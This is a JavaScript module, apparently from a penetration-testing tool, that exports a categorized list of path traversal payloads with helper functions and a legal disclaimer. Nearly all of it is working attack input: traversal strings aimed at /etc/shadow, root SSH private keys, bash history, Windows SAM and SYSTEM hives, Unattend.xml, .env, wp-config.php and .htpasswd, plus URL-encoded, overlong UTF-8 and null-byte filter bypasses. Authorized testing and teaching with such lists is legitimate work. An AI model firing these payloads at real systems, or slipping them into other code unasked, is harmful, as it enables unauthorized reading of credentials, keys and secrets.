// Path Traversal Payload Generator - Educational Penetration Testing Tool
// WARNING: For authorized testing and educational purposes only

export const pathTraversalPayloads = {
  unixTargets: {
    name: 'Unix / Linux File Targets',
    description: 'Common sensitive files on Unix-like systems',
    category: 'Unix Targets',
    payloads: [
      { name: '/etc/passwd',                code: '../../../etc/passwd' },
      { name: '/etc/shadow',                code: '../../../etc/shadow' },
      { name: '/etc/hosts',                 code: '../../../etc/hosts' },
      { name: '/etc/hostname',              code: '../../../etc/hostname' },
      { name: '/etc/os-release',            code: '../../../etc/os-release' },
      { name: '/proc/self/environ',         code: '../../../proc/self/environ' },
      { name: '/proc/self/cmdline',         code: '../../../proc/self/cmdline' },
      { name: '/proc/version',              code: '../../../proc/version' },
      { name: 'Root SSH private key',       code: '../../../root/.ssh/id_rsa' },
      { name: 'Root authorized keys',       code: '../../../root/.ssh/authorized_keys' },
      { name: 'Bash history',               code: '../../../root/.bash_history' },
      { name: '/var/log/auth.log',          code: '../../../var/log/auth.log' }
    ]
  },
  windowsTargets: {
    name: 'Windows File Targets',
    description: 'Common sensitive files on Windows systems',
    category: 'Windows Targets',
    payloads: [
      { name: 'Windows hosts file',         code: '..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts' },
      { name: 'SAM database',               code: '..\\..\\..\\Windows\\System32\\config\\SAM' },
      { name: 'SYSTEM hive',                code: '..\\..\\..\\Windows\\System32\\config\\SYSTEM' },
      { name: 'WIN.INI',                    code: '..\\..\\..\\Windows\\win.ini' },
      { name: 'BOOT.INI',                   code: '..\\..\\..\\boot.ini' },
      { name: 'IIS web.config',             code: '..\\..\\..\\inetpub\\wwwroot\\web.config' },
      { name: 'Unattend.xml (creds)',       code: '..\\..\\..\\Windows\\Panther\\Unattend.xml' },
      { name: 'User SAM (registry export)', code: '..\\..\\..\\Windows\\repair\\SAM' }
    ]
  },
  urlEncoded: {
    name: 'URL-Encoded Traversals',
    description: 'URL-encoded path traversal to bypass simple filters',
    category: 'URL Encoded',
    payloads: [
      { name: 'Single-encoded ../',         code: '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd' },
      { name: 'Double-encoded ../',         code: '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd' },
      { name: 'Encoded slash only',         code: '..%2f..%2f..%2fetc%2fpasswd' },
      { name: 'Mixed encoding',             code: '..%2F..%2F..%2Fetc/passwd' },
      { name: 'Encoded dot only',           code: '%2e%2e/%2e%2e/%2e%2e/etc/passwd' },
      { name: 'UTF-8 slash (overlong)',     code: '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd' },
      { name: 'UTF-8 dot (overlong)',       code: '%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd' },
      { name: 'Windows backslash encoded', code: '..%5c..%5c..%5cWindows%5cwin.ini' }
    ]
  },
  nullByte: {
    name: 'Null Byte Bypasses',
    description: 'Null byte injection to terminate file extension checks',
    category: 'Null Byte',
    payloads: [
      { name: 'Null byte (URL-encoded)',    code: '../../../etc/passwd%00.jpg' },
      { name: 'Null byte (raw)',            code: '../../../etc/passwd\x00.jpg' },
      { name: 'Null byte with .php ext',   code: '../../../etc/passwd%00.php' },
      { name: 'Null byte with .png ext',   code: '../../../etc/passwd%00.png' },
      { name: 'Double null byte',          code: '../../../etc/passwd%00%00.txt' }
    ]
  },
  webAppTargets: {
    name: 'Web Application Config Files',
    description: 'Target web application-specific configuration files',
    category: 'Web App Configs',
    payloads: [
      { name: '.env file (Node.js/PHP)',    code: '../../../.env' },
      { name: 'WordPress config',          code: '../../../wp-config.php' },
      { name: 'Tomcat web.xml',            code: '../../../WEB-INF/web.xml' },
      { name: 'Tomcat server.xml',         code: '../../../conf/server.xml' },
      { name: '.htaccess (Apache)',        code: '../../../.htaccess' },
      { name: '.htpasswd (Apache)',        code: '../../../.htpasswd' },
      { name: 'Spring application.properties', code: '../../../WEB-INF/classes/application.properties' },
      { name: 'Django settings.py',       code: '../../../settings.py' },
      { name: 'PHP configuration',        code: '../../../php.ini' },
      { name: 'nginx.conf',               code: '../../../etc/nginx/nginx.conf' },
      { name: 'Apache httpd.conf',        code: '../../../etc/apache2/apache2.conf' }
    ]
  },
  depthVariations: {
    name: 'Depth Variations',
    description: 'Different traversal depths for various directory structures',
    category: 'Depth Variations',
    payloads: [
      { name: '1 level deep',             code: '../etc/passwd' },
      { name: '2 levels deep',            code: '../../etc/passwd' },
      { name: '3 levels deep',            code: '../../../etc/passwd' },
      { name: '5 levels deep',            code: '../../../../../etc/passwd' },
      { name: '8 levels deep',            code: '../../../../../../../../etc/passwd' },
      { name: '10 levels deep',           code: '../../../../../../../../../../etc/passwd' },
      { name: 'Excessive traversal',      code: '/../../../../../../../../../../../etc/passwd' },
      { name: 'Absolute path bypass',     code: '/etc/passwd' }
    ]
  }
}

export const getAllCategories = () => {
  const categories = new Set()
  Object.values(pathTraversalPayloads).forEach(group => categories.add(group.category))
  return Array.from(categories)
}

export const getPayloadsByCategory = (category) => {
  return Object.entries(pathTraversalPayloads).filter(([, group]) => group.category === category)
}

export const disclaimer = `
⚠️  DISCLAIMER & LEGAL NOTICE ⚠️

This tool is for AUTHORIZED SECURITY TESTING & EDUCATIONAL PURPOSES ONLY.

Path traversal (directory traversal) vulnerabilities allow attackers to read files outside the intended web root. Only use this tool if you:
✓ Have explicit written authorization from the system owner
✓ Are testing your own systems or systems you own
✓ Are in an authorized penetration testing engagement
✓ Understand the legal implications in your jurisdiction

Unauthorized use against systems you do not own is ILLEGAL.
`
